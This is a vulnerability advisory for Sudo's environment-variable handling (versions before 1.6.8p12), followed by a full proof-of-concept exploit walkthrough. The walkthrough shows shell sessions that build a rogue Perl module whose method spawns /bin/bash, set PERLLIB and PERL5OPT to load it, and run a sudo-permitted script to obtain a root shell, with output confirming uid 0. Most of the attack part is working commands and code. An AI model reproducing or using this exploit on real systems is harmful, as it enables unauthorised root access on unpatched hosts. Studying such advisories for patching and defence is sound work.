source: http://www.securityfocus.com/bid/16184/info

Sudo is prone to a security-bypass vulnerability that could lead to arbitrary code execution. This issue is due to an error in the application when handling environment variables.

A local attacker with the ability to run Python scripts can exploit this vulnerability to gain access to an interactive Python prompt. That attacker may then execute arbitrary code with elevated privileges, facilitating the complete compromise of affected computers.

An attacker must have the ability to run Python scripts through Sudo to exploit this vulnerability.

This issue is similar to BID 15394 (Sudo Perl Environment Variable Handling Security Bypass Vulnerability). 

## Sudo local root exploit ##
## vuln versions : sudo < 1.6.8p12
## adv : http://www.securityfocus.com/bid/15394
## adv : http://www.frsirt.com/bulletins/2642

##by breno - breno@kalangolinux.org

## You need execute access to perl script in sudo ##

## cat /etc/sudoers ##

breno   ALL=(ALL) /home/breno/code.pl

## Now let's create your own perl module FTP.pm :) good name.

breno  ~ $ -> mkdir modules
breno  ~ $ -> mkdir FTP
breno  ~/modules $ -> ls
FTP
breno  ~/modules $ -> cd FTP
breno  ~/modules/FTP $ -> h2xs -AXc -n FTP
Defaulting to backwards compatibility with perl 5.8.7
If you intend this module to be compatible with earlier perl versions, please
specify a minimum perl version with the -b option.

Writing FTP/lib/FTP.pm
Writing FTP/Makefile.PL
Writing FTP/README
Writing FTP/t/FTP.t
Writing FTP/Changes
Writing FTP/MANIFEST
breno  ~/modules/FTP $ ->

breno  ~/modules/FTP/FTP $ -> perl Makefile.PL
Checking if your kit is complete...
Looks good
Writing Makefile for FTP
breno  ~/modules/FTP/FTP $ -> make
cp lib/FTP.pm blib/lib/FTP.pm
Manifying blib/man3/FTP.3pm
breno  ~/modules/FTP/FTP $ -> make test
PERL_DL_NONLAZY=1 /usr/bin/perl "-MExtUtils::Command::MM" "-e" "test_harness(0,
'blib/lib', 'blib/arch')" t/*.t
t/FTP....ok
All tests successful.
Files=1, Tests=1,  0 wallclock secs ( 0.03 cusr +  0.01 csys =  0.04 CPU)
breno  ~/modules/FTP/FTP $ ->

#Now i deleted the default FTP.pm (it was ugly), and create my beautiful module

breno  ~/modules/FTP/FTP/blib/lib $ -> vi FTP.pm

package FTP;

use strict;
use vars qw($VERSION);
$VERSION = '0.01';

sub new {
  my $package = shift;
  return bless({}, $package);
}

sub verbose {
    my $self = shift;
    system("/bin/bash");
    if (@_) {
    $self->{'verbose'} = shift;
      }
       return $self->{'verbose'};
}

sub hoot {
   my $self = shift;
   return "Don't pollute!" if $self->{'verbose'};
   return;
}

1;
__END__

EOF

# Remenber our super code.pl

breno  ~ $ -> vi code.pl

#!/usr/bin/perl

BEGIN { $| = 1; print "1..1\n"; }
END {print "not ok 1\n" unless $loaded;}
use FTP;
$loaded = 1;
print "ok 1\n";

my $obj = new FTP;
$obj->verbose(1);
my $result = $obj->hoot;
print ($result eq "Don't pollute!" ? "ok 2\n" : "not ok 2\n");

$obj->verbose(0);
my $result = $obj->hoot;
print ($result eq "" ? "ok 3\n" : "not ok 3\n");


EOF


# Now let's play with PERLLIB and PERL5OPT env.

breno  ~ $ -> export PERLLIB="/home/breno/modules/FTP/FTP/blib/lib/"
breno  ~ $ -> export PERL5OPT="-MFTP"

# Now get Root!! :)

breno  ~ $ -> sudo ./code.pl
Password:
1..1
ok 1
root  ~ # -> id
uid=0(root) gid=0(root) grupos=0(root)
root  ~ # ->
